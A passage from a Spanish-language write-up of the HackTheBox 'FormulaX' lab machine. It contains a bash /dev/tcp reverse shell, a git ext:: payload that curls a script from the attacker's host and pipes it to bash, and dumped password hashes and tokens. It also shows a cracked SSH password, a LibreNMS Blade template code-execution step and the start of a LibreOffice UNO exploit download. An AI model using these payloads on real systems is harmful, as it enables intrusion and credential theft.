</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>19:30:30.165628 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP <span style="color:#fff;font-weight:bold">echo</span> request, id 1, seq 2, length <span style="color:#ff0;font-weight:bold">64</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>19:30:30.165657 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP <span style="color:#fff;font-weight:bold">echo</span> reply, id 1, seq 2, length <span style="color:#ff0;font-weight:bold">64</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>19:30:31.167686 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP <span style="color:#fff;font-weight:bold">echo</span> request, id 1, seq 3, length <span style="color:#ff0;font-weight:bold">64</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>19:30:31.167716 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP <span style="color:#fff;font-weight:bold">echo</span> reply, id 1, seq 3, length <span style="color:#ff0;font-weight:bold">64</span></span></span></code></pre></div>
<p>Nos creamos un <code>rev.sh</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#0f0;font-weight:bold">#!/bin/bash
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>bash -c <span style="color:#0ff;font-weight:bold">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.71/443 0&gt;&amp;1&#34;</span></span></span></code></pre></div>
<p>Nos ponemos en escucha con <code>netcat</code> y usamos este payload <code>ext::sh -c curl% http://10.10.14.71:8081/rev.sh|bash</code></p>
<h1 id="user-pivoting-1">User Pivoting 1</h1>
<p>Enumerando la mÃ¡quina vÃ­ctima nos encontramos que hay una instancia de mongodb.
<code>tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -</code></p>
<p>Lo podemos ver mediante el comando <code>netstat -tulnp</code> o revisando el archivo <code>.env</code> de la aplicaciÃ³n.</p>






<pre tabindex="0"><code class="language-venv" data-lang="venv">www-data@formulax:~/app$ cat .env
cat .env
PORT = 8082
URL_DATABASE=&#34;mongodb://localhost:27017&#34;
SECRET=ThisIsTheN0deSecret
ADMIN_EMAIL=&#34;admin@chatbot.htb&#34;</code></pre>
<p>con <code>mongo --shell</code> podemos hacer peticiones mediante el CLI.</p>
<p>Enumerando las Bases de Datos vemos las siguientes</p>






<pre tabindex="0"><code class="language-mongo" data-lang="mongo">show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB</code></pre>
<p>Enumerando las &ldquo;tablas&rdquo; (colecciones en mongo), la Ãºnica que me llaman la atenciÃ³n es <code>messages</code> y <code>users</code></p>






<pre tabindex="0"><code class="language-mongo" data-lang="mongo">use admin
switched to db admin
show collections
system.version
use config
switched to db config
show collections
system.sessions
use local
switched to db local
show collections
startup_log
use testing
switched to db testing
show collections
messages
users</code></pre>
<p>La colecciÃ³n de mensajes estÃ¡ vacÃ­a pero la de usuarios no.</p>






<pre tabindex="0"><code class="language-mongo" data-lang="mongo">db.messages.find()

db.users.find()
{ &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457c&#34;), &#34;name&#34; : &#34;admin&#34;, &#34;email&#34; : &#34;admin@chatbot.htb&#34;, &#34;password&#34; : &#34;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&#34;, &#34;terms&#34; : true, &#34;value&#34; : true, &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI0NDA0MDh9.q_R-YzbX7fuJigMJuVCeuIIlr3WhWPQSwHd5HkU9BYs&#34;, &#34;__v&#34; : 0 }
{ &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457d&#34;), &#34;name&#34; : &#34;frank_dorky&#34;, &#34;email&#34; : &#34;frank_dorky@chatbot.htb&#34;, &#34;password&#34; : &#34;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&#34;, &#34;terms&#34; : true, &#34;value&#34; : true, &#34;authorization_token&#34; : &#34; &#34;, &#34;__v&#34; : 0 }
{ &#34;_id&#34; : ObjectId(&#34;66aa51b7af10999e6470d490&#34;), &#34;name&#34; : &#34;pointed&#34;, &#34;email&#34; : &#34;pointed@pointed.com&#34;, &#34;password&#34; : &#34;$2b$10$zhNJTJtpGe3/6QILJisd6uednRpMdaTopmes6TCgFL1KFkGQdjdpq&#34;, &#34;terms&#34; : true, &#34;value&#34; : false, &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NmFhNTFiN2FmMTA5OTllNjQ3MGQ0OTAiLCJpYXQiOjE3MjI0Mzg1NzZ9.EpNX-g0c9erS1XM7BDde8nLVhkDkzhpkoeTBV8fRKug&#34;, &#34;__v&#34; : 0 }</code></pre>
<p>Y tenemos hashes que podemos intentar crackear.</p>
<p>Revisando el example-hashes de hashcat. Puede ser un hash <code>bcrypt(sha256($pass)) / bcryptsha256 *</code>
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Pero no se encuentra el mÃ³dulo en hashcat.
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Por lo cual antes de descargar nada, probÃ© el otro mÃ³dulo que podÃ­a ser..
<code>bcrypt $2*$, Blowfish (Unix)</code>
<img src="images/Screenshot_13.png" alt="Write-up Image">
Consigo crackear el hash correspondiente al usuario <code>frank_dorky</code> , el del usuario administrador no.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Y esta es la password de <code>frank_dorky</code> para acceder por SSH</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ssh frank_dorky@10.129.230.190
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>The authenticity of host <span style="color:#0ff;font-weight:bold">&#39;10.129.230.190 (10.129.230.190)&#39;</span> can<span style="color:#0ff;font-weight:bold">&#39;t be established.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#0ff;font-weight:bold">ED25519 key fingerprint is SHA256:e0esz1Aos6gxct2ci4LGbCAR6i31EoktxFIvCFF+rcM.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#0ff;font-weight:bold">This key is not known by any other names.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#0ff;font-weight:bold">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#0ff;font-weight:bold">Warning: Permanently added &#39;</span>10.129.230.190<span style="color:#0ff;font-weight:bold">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#0ff;font-weight:bold">frank_dorky@10.129.230.190&#39;</span>s password: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span> * Support:        https://ubuntu.com/pro
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>This system has been minimized by removing packages and content that are
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>not required on a system that users <span style="color:#fff;font-weight:bold">do</span> not log into.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>To restore this content, you can run the <span style="color:#0ff;font-weight:bold">&#39;unminimize&#39;</span> command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Last login: Mon Jul <span style="color:#ff0;font-weight:bold">15</span> 13:46:54 <span style="color:#ff0;font-weight:bold">2024</span> from 10.10.14.41
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>frank_dorky@formulax:~$</span></span></code></pre></div>
<p>Con este usuario podemos leer la flag <code>user.txt</code></p>
<h1 id="user-pivoting-2">User Pivoting 2</h1>
<p>Pasando el <code>linpeas.sh</code> me he dado cuenta de otro puerto interesante que se me habÃ­a pasado.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:42931         0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>tcp        <span style="color:#ff0;font-weight:bold">0</span>      <span style="color:#ff0;font-weight:bold">0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      - </span></span></code></pre></div>
<p>En la mÃ¡quina estÃ¡n abiertos varios puertos que no he revisado.
Sabemos que el puerto <code>8082</code> corresponde a la aplicaciÃ³n principal, pero no se nada sobre los puertos <code>8081</code>, <code>8000</code> y <code>3000</code></p>
<p>En el puerto <code>8000</code> vemos lo siguiente y despuÃ©s de enumerar un rato no encuentro nada interesante asÃ­ que supuse que era un rabbit hole.
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Y en el puerto <code>8081</code> nos damos cuenta de que es el servicio que hemos explotado anteriormente.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>AsÃ­ que ahora hacemos el port forwarding al puerto <code>3000</code>
<code>$ sshpass -p 'manchesterunited' ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.230.190</code></p>
<p>Y vemos un CMS llamado <code>LibreNMS</code> y las credenciales encontradas para el usuario <code>frank_dorky</code> son vÃ¡lidas.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Encontramos varias vulnerabilidades para LibreNMS.
La que mas me llamÃ³ la atenciÃ³n fue <a href="https://www.shielder.com/advisories/librenms-about-authenticated-command-injection/">esta</a> pero es para una versiÃ³n mas antigua.</p>
<p>Inspeccionando otros exploits me di cuenta de una ruta en especifico.
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>A la cual no tenÃ­a permisos para acceder, asÃ­ que supuse que <code>frank_dorky</code> es un usuario de bajos privilegios en este panel.
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>Investigando un poco sobre como podrÃ­a aÃ±adir un usuario administrador, me encontrÃ© con este <a href="https://community.librenms.org/t/adding-admin-users-on-librenms/20782">post</a></p>
<p>Ahora solo necesito saber donde estÃ¡ el archivo <code>adduser.php</code></p>
<p>Un poco oculto pero encontrÃ© el archivo..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>rank_dorky@formulax:/opt/librenms$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>ls: cannot open directory <span style="color:#0ff;font-weight:bold">&#39;.&#39;</span>: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>frank_dorky@formulax:/opt/librenms$ ls -l adduser.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>-rwxr-xr-x <span style="color:#ff0;font-weight:bold">1</span> librenms librenms <span style="color:#ff0;font-weight:bold">956</span> Oct <span style="color:#ff0;font-weight:bold">18</span>  <span style="color:#ff0;font-weight:bold">2022</span> adduser.php</span></span></code></pre></div>
<p>Por lo cual aÃ±adÃ­ al usuario</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>ky@formulax:/opt/librenms$ ./adduser.php pointed pointed <span style="color:#ff0;font-weight:bold">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>User pointed added successfully</span></span></code></pre></div>
<p>Y ahora sÃ­ que pude acceder a las funciones restringidas para administradores del CMS.
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Tras buscar mas y mas, encontrÃ© este otro <a href="https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/">post</a></p>
<p>Donde se habla de un XSS que podrÃ­a elevarse a un RCE, a mÃ­ solo me importa la parte del RCE.</p>






<pre tabindex="0"><code>The impact of this vulnerability is greatly increased due to a feature called Alert Templates. This feature allows administrators to create custom templates that will be populated with specific values when an alert occurs.


The template engine used for this feature is Blade. The user-provided custom templates are rendered inline by using the Blade::render method:


librenms/includes/html/forms/alert-templates.inc.php

&lt;?php
Blade::render($vars[&#39;template&#39;]);

Attackers with the ability to control the value passed to this method can directly gain code execution. This is due to the fact that Blade templates allow executing arbitrary PHP code via the @php directive:


@php
  system(&#34;id&gt;/tmp/pwned&#34;);
@endphp</code></pre>
<p>Por lo cual nos dirigimos a <code>Alert Templates</code>
<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>Creamos una plantilla maliciosa..
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>Al intentar agregar la plantilla se quedaba colgado, asÃ­ que revisando la consola del navegador, descubro un subdominio que debo de agregar al <code>/etc/hosts</code>
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat /etc/hosts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#007f7f"># Host addresses</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>127.0.0.1  localhost librenms.com</span></span></code></pre></div>
<p>Ahora, accediendo con el dominio correcto, sÃ­ me deja crear la plantilla maliciosa.
<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
<p>Y ganamos acceso como <code>librenms</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.71] from (UNKNOWN) [10.129.230.190] <span style="color:#ff0;font-weight:bold">57972</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>bash: cannot <span style="color:#fff;font-weight:bold">set</span> terminal process group (970): Inappropriate ioctl <span style="color:#fff;font-weight:bold">for</span> device
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>librenms@formulax:~$ </span></span></code></pre></div>
<p>Revisando las variables de entorno de la aplicaciÃ³n vemos lo siguiente</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>DB_USERNAME=kai_relay
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>DB_PASSWORD=mychemic...</span></span></code></pre></div>
<p>Esta credencial es la del usuario <code>kai_relay</code></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>kai_relay@formulax:~$ sudo -l
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Matching Defaults entries <span style="color:#fff;font-weight:bold">for</span> kai_relay on forumlax:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    env_reset, timestamp_timeout=0, mail_badpass,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    secure_path=/usr/local/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/local/bin<span style="color:#0ff;font-weight:bold">\:</span>/usr/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/bin<span style="color:#0ff;font-weight:bold">\:</span>/sbin<span style="color:#0ff;font-weight:bold">\:</span>/bin<span style="color:#0ff;font-weight:bold">\:</span>/snap/bin,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    use_pty, env_reset, timestamp_timeout=<span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>User kai_relay may run the following commands on forumlax:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    (ALL) NOPASSWD: /usr/bin/office.sh</span></span></code></pre></div>
<p>Podemos ejecutar como cualquier usuario, root incluido, el script <code>/usr/bin/office.sh</code></p>
<p>Analizando este script</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>kai_relay@formulax:~$ cat /usr/bin/office.sh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#007f7f">#!/bin/bash</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>/usr/bin/soffice --calc --accept=<span style="color:#0ff;font-weight:bold">&#34;socket,host=localhost,port=2002;urp;&#34;</span> --norestore --nologo --nodefault --headless</span></span></code></pre></div>
<ul>
<li>
<p><code>--calc</code>: Esta opciÃ³n abre la aplicaciÃ³n de hojas de cÃ¡lculo (Calc) de LibreOffice o OpenOffice.</p>
</li>
<li>
<p><code>--accept=&quot;socket,host=localhost,port=2002;urp;&quot;</code>: Esta opciÃ³n permite que LibreOffice acepte conexiones desde un cliente a travÃ©s de un socket. En este caso, el socket estÃ¡ configurado para escuchar en el host <code>localhost</code> y el puerto <code>2002</code>. <code>urp</code> se refiere al protocolo Universal Remote Protocol de LibreOffice, que permite la comunicaciÃ³n entre clientes y la instancia de LibreOffice.</p>
</li>
<li>
<p><code>--norestore</code>: Deshabilita la restauraciÃ³n de documentos que estaban abiertos antes de un cierre inesperado o un fallo.</p>
</li>
<li>
<p><code>--nologo</code>: Desactiva la pantalla de inicio (logo) de LibreOffice.</p>
</li>
<li>
<p><code>--nodefault</code>: Evita que se abra cualquier documento predeterminado.</p>
</li>
<li>
<p><code>--headless</code>: Ejecuta LibreOffice en modo sin cabeza, es decir, sin interfaz grÃ¡fica de usuario. Esto es Ãºtil para operaciones automÃ¡ticas o en servidores donde no hay un entorno grÃ¡fico disponible.</p>
</li>
</ul>
<p>Este script inicia LibreOffice Calc en modo sin cabeza, aceptando conexiones de clientes a travÃ©s de un socket en <code>localhost</code> en el puerto <code>2002</code>, y desactiva diversas funcionalidades como la restauraciÃ³n de documentos, la pantalla de inicio y la apertura de documentos por defecto.</p>
<p>Este script tampoco nos sirve de mucho pero si hacemos una bÃºsqueda en Google&hellip; <img src="images/Screenshot_26.png" alt="Write-up Image"></p>
<p>Nos descargamos el exploit.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span> searchsploit -m multiple/remote/46544.py
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>  Exploit: Apache UNO / LibreOffice Version: 6.1.2 / OpenOffice 4.1.6 API - Remote Code Execution
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>      URL: https://www.exploit-db.com/exploits/46544
